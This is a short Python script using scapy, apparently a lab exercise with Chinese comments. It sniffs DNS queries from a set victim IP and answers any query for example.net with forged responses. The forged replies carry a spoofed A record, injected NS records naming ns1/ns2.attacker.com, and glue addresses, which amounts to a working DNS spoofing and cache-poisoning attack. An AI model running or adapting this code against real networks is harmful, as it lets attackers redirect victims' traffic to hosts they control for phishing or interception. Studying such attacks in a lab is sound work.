from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import *


victimIP = "10.10.10.195"   # FIXME: Client IP


def spoof_dns(pkt):
    print(pkt[DNS].qd.qname)   # DNS查询数据包 / 查询部分 / 域名字段
    # 判断域名字段中是否有关于'example.net'的查询
    if DNS in pkt and 'example.net' in pkt[DNS].qd.qname.decode('utf-8'):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)    # DNS port固定为53

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=303030, rdata='10.10.10.1')

        # The Authority Section
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=90000, rdata='ns1.attacker.com')
        NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=90000, rdata='ns2.attacker.com')

        # The Additional Section
        Addsec1 = DNSRR(rrname='ns1.attacker.com', type='A', ttl=90000, rdata='10.10.10.1')
        Addsec2 = DNSRR(rrname='ns2.attacker.com', type='A', ttl=90000, rdata='10.10.10.2')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2,
                     an=Anssec, ns=NSsec1 / NSsec2, ar=Addsec1 / Addsec2)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        send(spoofpkt)


# Sniff: from Victim and dst_port=53(DNS port), UDP
f = 'udp and src host {} and dst port 53'.format(victimIP)
pkt = sniff(filter=f, prn=spoof_dns, iface="eth0")
